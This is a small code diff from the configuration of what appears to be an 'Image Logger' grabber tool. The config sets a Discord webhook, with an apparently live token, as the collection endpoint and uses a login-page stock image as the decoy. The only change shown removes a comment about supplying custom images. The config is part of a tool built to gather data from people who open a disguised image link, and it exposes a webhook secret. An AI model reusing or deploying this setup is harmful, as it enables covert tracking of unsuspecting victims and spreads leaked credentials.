@@ -9,7 +9,7 @@ __author__ = "MrDark"
 
 config = {
     "webhook": "https://discord.com/api/webhooks/1401030435500327123/Y-fH4HrinvHlJn4QOoTpkl446A-XspptlmOskYUXpzSR1txYfesXVhuxF9X--uGQfAMv",
-    "image": "https://static.vecteezy.com/ti/vetor-gratis/p1/11277904-tela-de-login-modelo-de-ilustracaoial-de-design-de-pagina-de-login-moderno-gratis-vetor.jpg", # You can also have a custom image by using a URL argument
+    "image": "https://static.vecteezy.com/ti/vetor-gratis/p1/11277904-tela-de-login-modelo-de-ilustracaoial-de-design-de-pagina-de-login-moderno-gratis-vetor.jpg", 
     "imageArgument": True, 
     "username": "Image Logger", 
     "color": 0x00FFFF,
